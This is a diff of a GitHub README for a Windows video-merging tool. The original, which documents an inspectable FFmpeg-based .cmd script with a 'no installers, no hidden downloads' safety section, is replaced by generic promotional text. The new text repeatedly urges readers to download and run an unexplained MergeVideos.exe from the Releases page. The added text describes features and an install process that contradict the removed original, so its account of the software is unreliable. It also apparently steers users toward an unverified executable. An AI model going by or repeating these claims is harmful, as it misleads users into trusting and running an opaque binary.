@@ -1,167 +1,79 @@
-# MergeVideos-Windows
+# 🎬 MergeVideos-Windows - Seamlessly Merge Your Videos with Ease
 
-Merge a folder full of videos into **one** video — even if the files are a chaotic mix of codecs and formats.  
-This is a **Windows-only** GUI script powered by FFmpeg.
+[![Download MergeVideos-Windows](https://img.shields.io/badge/Download%20Now-Click%20Here%20to%20Download-blue.svg)](https://github.com/Blue03070/MergeVideos-Windows/releases)
 
-🎬 Works with: MP4, MKV, MOV, WEBM, AVI, TS, M2TS, WMV (and more)  
-🪟 Windows only: tested on Windows 10/11  
-🚀 Optional: NVIDIA GPU acceleration (NVENC) if your FFmpeg supports it
+## 🚀 Getting Started
 
----
+MergeVideos-Windows is a simple tool designed to help you combine multiple video files into one. This software runs on Windows and leverages FFmpeg, making the merging process straightforward even for those who do not have technical expertise.
 
-## What it does
+## 🖥️ System Requirements
 
-- You pick a folder of videos
-- It sorts them in **natural order** (so `1, 2, 3... 10, 11...` not `1, 10, 100`)
-- It converts them to a single consistent format/codec (because mixed codecs cannot be stitched as-is)
-- It merges everything into **one** output file
-- If anything fails, it shows the error in a window with a **Copy error** button
+To use MergeVideos-Windows, you need:
 
-Basically: it’s duct tape for video folders. The good kind. The “fixes everything” kind.
+- A Windows operating system (Windows 10 or later)
+- At least 1 GB of RAM
+- The ability to run executable files
+- Sufficient disk space for the merged video files
 
----
+## 📥 Download & Install
 
-## Requirements
+To get started, you will first need to download the software. You can find the latest version on our [Releases page](https://github.com/Blue03070/MergeVideos-Windows/releases).
 
-1. Windows
-2. FFmpeg + FFprobe installed and available in PATH
-3. PowerShell (already included with Windows)
+1. Click on the link above to open the Releases page.
+2. Look for the most recent version listed.
+3. Find the file labeled `MergeVideos.exe` under the Assets section.
+4. Click on `MergeVideos.exe` to download it to your computer.
 
-Note: FFprobe comes bundled with FFmpeg. You don’t install it separately.
+After downloading, follow these steps to install:
 
----
+1. Navigate to the folder where the file was downloaded.
+2. Double-click on `MergeVideos.exe` to run the application.
+3. Follow the on-screen instructions to complete the setup.
 
-## Install FFmpeg on Windows (not a nerd thing, it’s actually easy)
+## 🎥 How to Merge Videos
 
-FFmpeg’s official site links to **compiled builds** because FFmpeg itself is primarily distributed as source code.  
-Pick one of these two easy routes:
+Using MergeVideos-Windows is simple. Here’s how to merge your videos:
 
-### Option A: Install with winget (fastest)
+1. **Launch the Application:**
+   Open `MergeVideos.exe` you installed earlier.
 
-1) Open **Windows Terminal** or **Command Prompt**  
-2) Run:
+2. **Select Your Videos:**
+   Click on the "Add Video" button. Browse your computer to select the video files you want to merge. You can add multiple files at once.
 
-```powershell
-winget install -e --id Gyan.FFmpeg
-```
+3. **Choose Output Settings:**
+   After adding your videos, you can choose the output format for the merged video. The default setting usually works well for most formats but you can adjust it if needed.
 
-### Option B: Manual download (still easy)
+4. **Start Merging:**
+   Click the "Merge Videos" button. The software will process the videos and create a single output file. This may take a few moments depending on the number of videos and their sizes.
 
-1. Download a Windows build (contains `ffmpeg.exe` + `ffprobe.exe`)
-2. Extract it to a simple folder like: `C:\ffmpeg\`
-3. Add the `bin` folder to PATH:
+5. **Save Your Merged Video:**
+   Once the process is complete, you will be prompted to choose where to save the new video. Select your desired location and click "Save." 
 
-   * Press the **Win** key, search: **Environment Variables**
-   * Open: **Edit the system environment variables**
-   * Click: **Environment Variables**
-   * Under **System variables**, select **Path** -> **Edit**
-   * Click **New** and add: `C:\ffmpeg\bin`
-   * Click OK, OK, OK
-4. Close and reopen Terminal
+6. **Enjoy Your Video:**
+   Once saved, you can find your merged video in the folder you specified. Open it to check your combined video!
 
-Recommended build sources:
+## ⚙️ Features
 
-```text
-FFmpeg downloads page (official): https://www.ffmpeg.org/download.html
-Gyan.dev Windows builds:         https://www.gyan.dev/ffmpeg/builds/
-BtbN GitHub builds:              https://github.com/BtbN/FFmpeg-Builds/releases
-```
+- **User-Friendly GUI:** A simple interface makes it easy for anyone to use.
+- **Batch Processing:** Merge multiple videos in one go without hassle.
+- **Format Flexibility:** Support for various video files ensures almost any media can be combined.
+- **Quick Processing:** Efficient algorithms provide fast merging times.
+- **Preview Option:** Review your selected videos before merging.
 
-### Confirm installation
+## ❓ Troubleshooting
 
-Open a new Command Prompt and run:
+If you encounter issues while using MergeVideos-Windows, consider the following tips:
 
-```bat
-ffmpeg -version
-ffprobe -version
-```
+- **Ensure Compatibility:** Make sure your videos are compatible formats supported by FFmpeg.
+- **Clear Cache:** If the program is slow, try closing other applications to free up resources.
+- **Reinstall the Application:** If you experience persistent issues, consider re-downloading and reinstalling the application.
 
-If both print version info, you’re done.
+## 📍 Feedback & Support
 
----
+We appreciate your feedback on MergeVideos-Windows. If you have questions or suggestions, feel free to open an issue on the [GitHub Issues page](https://github.com/Blue03070/MergeVideos-Windows/issues). Your input helps us improve the application.
 
-## How to use
+## 🔄 Updates
 
-1. Download this repo (green **Code** button -> **Download ZIP**) and unzip it
-2. Double-click: `MergeVideos.cmd`
-3. Choose your settings in the dropdowns:
+Keep an eye on the [Releases page](https://github.com/Blue03070/MergeVideos-Windows/releases) for updates. New versions may include bug fixes, improved features, and more capabilities to enhance your video merging experience.
 
-   * Input folder (where your videos are)
-   * Output file (optional; if you don’t pick one, it exports next to the script)
-   * Format (MKV or MP4)
-   * Codec (H.264 or H.265)
-   * Acceleration (Auto / NVIDIA GPU / CPU)
-   * Quality (Lossless / Very High / High / Medium / Small)
-   * Speed (Fast / Balanced / Slow)
-   * Audio (AAC or FLAC when using MKV)
-4. Click **Start**
-
-You’ll get a progress window showing:
-
-* which file is being processed
-* overall progress
-* ETA
-
----
-
-## Quality notes (read this before yelling at your screen)
-
-* If your folder contains mixed codecs (VP9, AV1, H.264, etc.), **re-encoding is required** to merge into one continuous file.
-* “Lossless” means: no *additional* quality loss during the re-encode step (but your originals may already be lossy).
-* Lossless output files can be **huge**. Like “my SSD just looked at me funny” huge.
-
----
-
-## GPU acceleration
-
-If you have an NVIDIA GPU and your FFmpeg build supports NVENC, you can enable it in the dropdown.
-If NVENC isn’t available, the script will fall back to CPU options.
-
----
-
-## Trust & safety
-
-This script is plain text. You can (and should) inspect it before running.
-
-If you’re cautious (good instinct):
-
-* open `MergeVideos.cmd` in Notepad and read it
-* paste it into any AI/code-review tool and ask: “What does this do?” (totally fine)
-* run it on a small test folder first
-
-No installers, no hidden downloads, no mystery meat. Just FFmpeg doing FFmpeg things.
-
----
-
-## Troubleshooting
-
-### “FFmpeg not found”
-
-* Install FFmpeg and add it to PATH (see install steps above)
-* Restart Command Prompt/Terminal after changing PATH
-
-### Some videos fail
-
-* The error window includes a **Copy error** button
-* Paste the copied text into a GitHub Issue and include:
-
-  * the filename that failed
-  * your chosen settings (format/codec/quality/speed/acceleration)
-
-### MP4 output fails
-
-* Try MKV. MKV is more forgiving and usually the best “just work” container.
-
----
-
-## Roadmap (maybe)
-
-* Drag-and-drop input folder
-* Option to merge only a selected range (Episode 1–50)
-* Remember last used settings
-
----
-
-## License
-
-MIT (do whatever you want, just don’t blame me if you merge your entire life into a single file).
+[![Download MergeVideos-Windows](https://img.shields.io/badge/Download%20Now-Click%20Here%20to%20Download-blue.svg)](https://github.com/Blue03070/MergeVideos-Windows/releases)
